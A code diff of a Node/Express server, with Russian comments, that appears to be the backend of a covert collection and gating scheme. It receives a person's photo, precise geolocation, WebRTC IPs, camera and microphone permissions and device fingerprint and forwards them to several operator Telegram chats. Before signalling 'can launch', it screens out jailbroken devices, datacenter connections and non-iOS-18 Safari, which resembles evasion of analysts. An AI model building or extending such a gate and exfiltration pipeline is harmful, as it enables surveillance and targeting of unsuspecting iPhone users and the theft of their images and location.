@@ -1,4 +1,4 @@
-// === server/index.js (photo+caption + one HTML doc; + VT18/18.4 any-of; patched JB logic + iPad desktop + MacIntel OK + UA iOS fallback) ===
+// === server/index.js (backend gate; VT18 required; 18.4 ignored; iPad desktop/MacIntel OK; JB logic; multi-chat) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -7,6 +7,9 @@ import Database from 'better-sqlite3';
 import { fileURLToPath } from 'url';
 
 // Node 18+ имеет глобальные fetch/FormData/Blob
+if (typeof fetch !== 'function' || typeof FormData !== 'function' || typeof Blob !== 'function') {
+  throw new Error('Node 18+ with global fetch/FormData/Blob is required');
+}
 
 // ==== ENV ====
 const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
@@ -24,8 +27,8 @@ const PUBLIC_DIR = path.join(__dirname, 'public');
 // ==== App ====
 const app = express();
 app.set('trust proxy', true);
-app.use(express.json({ limit: '15mb' }));
-app.use(express.urlencoded({ extended: true, limit: '15mb' }));
+app.use(express.json({ limit: '25mb' }));
+app.use(express.urlencoded({ extended: true, limit: '25mb' }));
 
 // --- CORS
 app.use((_, res, next) => {
@@ -49,6 +52,7 @@ app.use(express.static(PUBLIC_DIR));
 app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));
 
 // ==== DB init ====
+// Новая таблица: много chatId на один code
 try {
   const dir = path.dirname(DB_PATH);
   if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
@@ -57,6 +61,7 @@ try {
 }
 console.log('[db] using', DB_PATH);
 const db = new Database(DB_PATH);
+// старая одноключевая таблица (на совместимость)
 db.prepare(`
   CREATE TABLE IF NOT EXISTS user_codes (
     code       TEXT PRIMARY KEY,
@@ -64,7 +69,17 @@ db.prepare(`
     created_at INTEGER NOT NULL
   );
 `).run();
-db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();
+// новая многозначная таблица
+db.prepare(`
+  CREATE TABLE IF NOT EXISTS user_code_map (
+    code       TEXT NOT NULL,
+    chat_id    TEXT NOT NULL,
+    created_at INTEGER NOT NULL,
+    PRIMARY KEY (code, chat_id)
+  );
+`).run();
+db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_code_map_code ON user_code_map(code);`).run();
+db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_code_map_chat ON user_code_map(chat_id);`).run();
 
 // ==== helpers ====
 function requireAdminSecret(req, res, next) {
@@ -121,17 +136,8 @@ function safeJson(obj, space = 0) {
   try { return JSON.stringify(obj, null, space); }
   catch { return String(obj); }
 }
-function short(str, n = 64) {
-  if (!str) return '';
-  str = String(str);
-  return str.length <= n ? str : (str.slice(0, n - 3) + '...');
-}
-function gmLink(lat, lon, z = 17) {
-  const href = `https://maps.google.com/?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&z=${z}`;
-  return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
-}
-
 const OK = (b) => b ? '✅' : '❌';
+
 function normVer(maybe) {
   if (typeof maybe === 'number') return maybe;
   if (typeof maybe === 'string') {
@@ -157,7 +163,7 @@ function isIgnoredScheme(s = '') {
   return IGNORE_SCHEMES.some(rx => rx.test(String(s)));
 }
 
-// ===== iPad desktop-mode detection (патч) =====
+// ===== iPad desktop-mode detection =====
 function isIpadDesktop({ platform, userAgent, cp }) {
   const plat = String(platform || '');
   const ua   = String(userAgent || '');
@@ -190,14 +196,14 @@ function pickIosVersion(iosVersion, cp, userAgent, platform) {
   return null;
 }
 
-// === НОРМАЛИЗАЦИЯ featuresSummary (VT18/18.4) — ANY-OF ===
-function normalizeFeatures(featuresSummary) {
+// === НОРМАЛИЗАЦИЯ featuresSummary (VT18 строго обязателен; 18.4 только для сведений) ===
+function normalizeFeatures_Strict18Only(featuresSummary) {
   const fv = featuresSummary || {};
   const tag = (x) => (x === true || String(x).toLowerCase() === 'ok') ? 'ok' : '—';
   const VT18 = tag(fv.VT18 ?? fv.vt18 ?? fv.viewTransitions);
   const V184 = tag(fv.v18_4 ?? fv.v184 ?? fv.triple18_4 ?? fv.shape_cookie_webauthn);
-  // ВАЖНО: ok = true, если ПРОШЁЛ ХОТЯ БЫ ОДИН тест
-  return { VT18, v18_4: V184, ok: (VT18 === 'ok' || V184 === 'ok') };
+  // Ок — ТОЛЬКО если VT18 === 'ok'. 18.4 не даёт пропуска.
+  return { VT18, v18_4: V184, ok: (VT18 === 'ok') };
 }
 
 function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {}, features }) {
@@ -228,7 +234,7 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {}, featu
   const camOk  = perms.camera === 'granted' || perms.camera === true;
   const micOk  = perms.microphone === 'granted' || perms.microphone === true;
 
-  // если фичесаммари нет — не блочим
+  // Если фичесаммари нет — не блочим. Если есть — строго VT18.
   const featuresOk = features ? !!features.ok : true;
 
   const canLaunch = iosOk && platformOk && jbOk && featuresOk;
@@ -244,8 +250,23 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {}, featu
   };
 }
 
-// [HTML] — отчёт (чеклист + сводка + JB-таблица + сырой JSON)
-function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc, features }) {
+// Получить все chatId для code (uniq по множественной/старой таблице)
+function getChatIdsForCode(code) {
+  const C = String(code).toUpperCase();
+  const ids = new Set();
+  try {
+    const rowsMap = db.prepare('SELECT chat_id FROM user_code_map WHERE code = ?').all(C);
+    rowsMap.forEach(r => ids.add(String(r.chat_id)));
+  } catch {}
+  try {
+    const rowOld = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?').get(C);
+    if (rowOld?.chat_id) ids.add(String(rowOld.chat_id));
+  } catch {}
+  return [...ids];
+}
+
+// [HTML] — отчёт
+function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc, features, strictTriggered, strictFailed }) {
   const s   = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features });
   const jb  = cp?.jbProbesActive || {};
   const jbSum  = jb.summary || {};
@@ -288,7 +309,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
     <div class="card">
       <h2>Чеклист статуса</h2>
       <div class="kv">
-        <div><b>Safari features (any-of)</b></div><div>${OK(s.featuresOk)} VT18=<span class="pill">${escapeHTML(s.features?.VT18 || '—')}</span> · 18.4=<span class="pill">${escapeHTML(s.features?.v18_4 || '—')}</span></div>
+        <div><b>Safari features</b></div><div>${OK(s.featuresOk)} VT18=<span class="pill">${escapeHTML(s.features?.VT18 || '—')}</span> · 18.4=<span class="pill">${escapeHTML(s.features?.v18_4 || '—')}</span> <span class="pill">rule: 18.0-only</span></div>
         <div><b>iOS ≥ 18</b></div><div>${OK(s.iosOk)} <span class="${s.iosOk?'ok':'bad'}">${s.iosOk?'ok':'low'}</span> <span class="pill"><code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code></span></div>
         <div><b>Платформа iPhone/iPad/MacIntel</b></div><div>${OK(s.platformOk)} <span class="${s.platformOk?'ok':'bad'}">${
           s.platformOk
@@ -300,7 +321,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
         <div><b>Гео-разрешение</b></div><div>${OK(s.geoOk)}</div>
         <div><b>Камера</b></div><div>${OK(s.camOk)}</div>
         <div><b>Микрофон</b></div><div>${OK(s.micOk)}</div>
-        <div><b>Итог</b></div><div><b>${s.canLaunch ? 'Можно запускать' : 'Нельзя запускать'}</b></div>
+        <div><b>Итог</b></div><div><b>${s.canLaunch ? 'Можно запускать' : 'Нельзя запускать'}</b>${strictTriggered ? (strictFailed ? ' <span class="bad">(strict fail)</span>' : ' <span class="ok">(strict ok)</span>') : ''}</div>
       </div>
     </div>
   `;
@@ -312,7 +333,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
         <div><b>Code</b></div><div><code>${escapeHTML(String(code).toUpperCase())}</code></div>
         <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
         <div><b>iOS / Platform</b></div><div><code>${escapeHTML(String(s.iosVersionDetected ?? ''))}</code> · <code>${escapeHTML(String(platform||''))}</code></div>
-        <div><b>Safari features</b></div><div>VT18=<code>${escapeHTML(s.features?.VT18 || '—')}</code>, 18.4=<code>${escapeHTML(s.features?.v18_4 || '—')}</code> <span class="pill">mode: any-of</span></div>
+        <div><b>Safari features</b></div><div>VT18=<code>${escapeHTML(s.features?.VT18 || '—')}</code>, 18.4=<code>${escapeHTML(s.features?.v18_4 || '—')}</code> <span class="pill">rule: 18.0-only</span></div>
         <div><b>Jailbreak</b></div><div>${escapeHTML(jbInfo)}</div>
         <div><b>Geo</b></div><div>${geo ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(String(geo.acc))} м` : 'нет данных'}</div>
       </div>
@@ -342,7 +363,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
 
   const jsonPretty = safeJson({
     geo, userAgent, platform, iosVersionDetected: s.iosVersionDetected, isSafari,
-    featuresSummary: s.features,       // <-- фикс: кладём нормализованное
+    featuresSummary: s.features,  // кладём нормализованное
     client_profile: cp, device_check: dc
   }, 2);
 
@@ -374,7 +395,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
         ${overview}
         ${tableJb}
         ${raw}
-        <div class="muted">Авто-генерация</div>
+        <div class="muted">Гейт на сервере • Правило: VT18 обязательно (18.4 игнорируется как пропуск)</div>
       </div>
     </body>
     </html>
@@ -387,14 +408,15 @@ app.get('/health', (_req, res) => res.json({ ok: true }));
 app.get('/api/debug/db', (_req, res) => {
   try {
     const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
-    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
-    res.json({ ok:true, DB_PATH, size, codes });
+    const oldCnt = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
+    const mapCnt = db.prepare('SELECT COUNT(*) AS c FROM user_code_map').get().c;
+    res.json({ ok:true, DB_PATH, size, old_table: oldCnt, map_table: mapCnt });
   } catch (e) {
     res.status(500).json({ ok:false, error:String(e) });
   }
 });
 
-// ==== Admin: register-code ====
+// ==== Admin: register-code (один chatId) ====
 app.post('/api/register-code', requireAdminSecret, (req, res) => {
   try {
     const { code, chatId } = req.body || {};
@@ -404,11 +426,48 @@ app.post('/api/register-code', requireAdminSecret, (req, res) => {
     if (!chatId || !/^-?\d+$/.test(String(chatId))) {
       return res.status(400).json({ ok:false, error:'Invalid chatId' });
     }
+    const C = String(code).toUpperCase();
+    const ID = String(chatId);
+    // новая таблица — много chatId на один code
+    db.prepare('INSERT OR IGNORE INTO user_code_map(code, chat_id, created_at) VALUES(?,?,?)')
+      .run(C, ID, Date.now());
+    // на совместимость — старая таблица (последний chatId перезатрёт предыдущий)
     db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
-      .run(String(code).toUpperCase(), String(chatId), Date.now());
-    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
+      .run(C, ID, Date.now());
+    res.json({ ok:true, code:C, chatId:ID });
   } catch (e) {
     console.error('[register-code] error:', e);
+    res.status(500).json({ ok:false, error:'Internal' });
+  }
+});
+
+// ==== Admin: register-codes (несколько chatId) ====
+app.post('/api/register-codes', requireAdminSecret, (req, res) => {
+  try {
+    const { code, chatIds } = req.body || {};
+    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
+      return res.status(400).json({ ok:false, error:'Invalid code' });
+    }
+    if (!Array.isArray(chatIds) || chatIds.length === 0) {
+      return res.status(400).json({ ok:false, error:'chatIds[] required' });
+    }
+    const C = String(code).toUpperCase();
+    const stmt = db.prepare('INSERT OR IGNORE INTO user_code_map(code, chat_id, created_at) VALUES(?,?,?)');
+    const now = Date.now();
+    for (const raw of chatIds) {
+      const ID = String(raw);
+      if (!/^-?\d+$/.test(ID)) continue;
+      stmt.run(C, ID, now);
+    }
+    // Совместимость: если есть хотя бы один — кладём первый в старую таблицу
+    const all = getChatIdsForCode(C);
+    if (all[0]) {
+      db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
+        .run(C, all[0], now);
+    }
+    res.json({ ok:true, code:C, chatIds:getChatIdsForCode(C) });
+  } catch (e) {
+    console.error('[register-codes] error:', e);
     res.status(500).json({ ok:false, error:'Internal' });
   }
 });
@@ -437,28 +496,81 @@ app.get('/api/client-ip', (req, res) => {
   res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
 });
 
-// ==== API: report (photo + short caption + one HTML doc) ====
+// ==== API: gate (чистая проверка без отправки в TG — удобно для фронта) ====
+app.post('/api/gate', (req, res) => {
+  try {
+    const {
+      userAgent, platform, iosVersion,
+      client_profile, device_check, featuresSummary,
+      strict
+    } = req.body || {};
+
+    const cp = client_profile || {};
+    const dc = device_check   || {};
+    const feats = normalizeFeatures_Strict18Only(featuresSummary);
+    const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features: feats });
+
+    let strictTriggered = !!(strict === true || strict === 1 || String(strict) === '1');
+    let strictFailed = false;
+    if (strictTriggered) {
+      const sc = Number(dc?.score ?? NaN);
+      if (!Number.isFinite(sc) || sc < 60) {
+        strictFailed = true;
+      }
+    }
+
+    const canLaunch = s.canLaunch && (!strictTriggered || !strictFailed);
+    return res.json({
+      ok: true,
+      decision: {
+        canLaunch,
+        strict: { enabled: strictTriggered, failed: strictFailed, score: dc?.score ?? null }
+      },
+      features: feats,
+      iosVersionDetected: s.iosVersionDetected,
+      platformOk: s.platformOk,
+      jbOk: s.jbOk,
+      jbLabel: s.jbLabel,
+      dcOk: s.dcOk
+    });
+  } catch (e) {
+    res.status(500).json({ ok:false, error: e.message || 'Internal error' });
+  }
+});
+
+// ==== API: report (photo + caption + one HTML doc; принимает решение на сервере) ====
 app.post('/api/report', async (req, res) => {
   try {
     const {
+      // базовая инфа
       userAgent, platform, iosVersion, isSafari,
+      // данные
       geo, photoBase64, note, code,
+      // профили
       client_profile,   // включает jbProbesActive, permissions, webrtcIps, ...
       device_check,     // { score, label, reasons[], details{...} }
-      featuresSummary   // <-- НОВОЕ (клиент присылает VT18/18.4)
+      featuresSummary,  // клиентский результат VT18/18.4
+      strict            // true/1 включает порог по device_check.score
     } = req.body || {};
 
     if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
     if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });
 
-    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
-      .get(String(code).toUpperCase());
-    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
+    const chatIds = getChatIdsForCode(String(code).toUpperCase());
+    if (!chatIds.length) return res.status(404).json({ ok:false, error:'Unknown code' });
 
     const cp = client_profile || {};
     const dc = device_check   || {};
-    const feats = normalizeFeatures(featuresSummary);   // <-- any-of нормализация
+    const feats = normalizeFeatures_Strict18Only(featuresSummary); // <-- правило 18.0-only
     const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features: feats });
+
+    let strictTriggered = !!(strict === true || strict === 1 || String(strict) === '1');
+    let strictFailed = false;
+    if (strictTriggered) {
+      const sc = Number(dc?.score ?? NaN);
+      if (!Number.isFinite(sc) || sc < 60) strictFailed = true;
+    }
+    const canLaunch = s.canLaunch && (!strictTriggered || !strictFailed);
 
     const captionLines = [
       '<b>Новый отчёт 18+ проверка</b>',
@@ -467,38 +579,51 @@ app.post('/api/report', async (req, res) => {
       `${OK(s.platformOk)} Платформа: <code>${escapeHTML(String(platform||'n/a'))}${s.ipadDesktopOk ? ' (iPad desktop-mode)' : (s.macIntelOk ? ' (MacIntel)' : '')}</code>`,
       `${OK(s.jbOk)} ${s.jbOk ? 'нет джейлбрейка' : 'обнаружены JB-признаки'}`,
       `${OK(s.dcOk)} DC/ISP: ${s.dcOk ? 'нет' : '<b>найдены</b>'}`,
-      `Safari (any-of): ${OK(s.featuresOk)} VT18=<code>${escapeHTML(feats.VT18)}</code>, 18.4=<code>${escapeHTML(feats.v18_4)}</code>`,
-      `Geo: ${geo ? `${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(String(geo.acc))}</code>m` : '<code>нет</code>'}`,
+      `Safari: ${OK(s.featuresOk)} VT18=<code>${escapeHTML(feats.VT18)}</code>, 18.4=<code>${escapeHTML(feats.v18_4)}</code> <i>(rule: 18.0-only)</i>`,
+      `Geo: ${geo ? `<a href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> ±${escapeHTML(String(geo.acc))}m` : '<code>нет</code>'}`,
       `UA: <code>${escapeHTML(userAgent || '')}</code>`,
-      `Итог: <b>${s.canLaunch ? 'Можно запускать' : 'Нельзя запускать'}</b>`,
+      `Итог: <b>${canLaunch ? 'Можно запускать' : 'Нельзя запускать'}</b>${strictTriggered ? (strictFailed ? ' (strict fail)' : ' (strict ok)') : ''}`,
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
     ].filter(Boolean);
     const caption = captionLines.join('\n');
 
     const buf = b64ToBuffer(photoBase64);
-    const tgPhoto = await sendPhotoToTelegram({
-      chatId: String(row.chat_id),
-      caption,
-      photoBuf: buf
-    });
-
     const html = buildHtmlReport({
       code, geo, userAgent, platform, iosVersion, isSafari,
-      cp, dc, features: feats
+      cp, dc, features: feats, strictTriggered, strictFailed
     });
     const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
-    const tgDoc = await sendDocumentToTelegram({
-      chatId: String(row.chat_id),
-      htmlString: html,
-      filename: fname
-    });
 
-    res.json({
+    // Рассылаем всем chatId
+    const sent = [];
+    for (const id of chatIds) {
+      try {
+        const tgPhoto = await sendPhotoToTelegram({ chatId: String(id), caption, photoBuf: buf });
+        sent.push({ chatId: String(id), ok: true, message_id: tgPhoto?.result?.message_id, type: 'photo' });
+      } catch (e) {
+        sent.push({ chatId: String(id), ok: false, error: String(e), type: 'photo' });
+      }
+      try {
+        const tgDoc = await sendDocumentToTelegram({ chatId: String(id), htmlString: html, filename: fname });
+        sent.push({ chatId: String(id), ok: true, message_id: tgDoc?.result?.message_id, type: 'document' });
+      } catch (e) {
+        sent.push({ chatId: String(id), ok: false, error: String(e), type: 'document' });
+      }
+    }
+
+    return res.json({
       ok: true,
-      sent: [
-        { chatId: String(row.chat_id), ok: true, message_id: tgPhoto?.result?.message_id, type: 'photo' },
-        { chatId: String(row.chat_id), ok: true, message_id: tgDoc?.result?.message_id, type: 'document' }
-      ]
+      decision: {
+        canLaunch,
+        strict: { enabled: strictTriggered, failed: strictFailed, score: dc?.score ?? null }
+      },
+      features: feats,
+      iosVersionDetected: s.iosVersionDetected,
+      platformOk: s.platformOk,
+      jbOk: s.jbOk,
+      jbLabel: s.jbLabel,
+      dcOk: s.dcOk,
+      sent
     });
   } catch (e) {
     console.error('[report] error:', e);
@@ -515,7 +640,6 @@ app.use((req, res) => {
 // ==== Start ====
 app.listen(PORT, () => {
   console.log(`[server] listening on :${PORT}`);
-  // eslint-disable-next-line no-undef
   console.log(`[server] Public dir: ${PUBLIC_DIR}`);
   console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
   console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
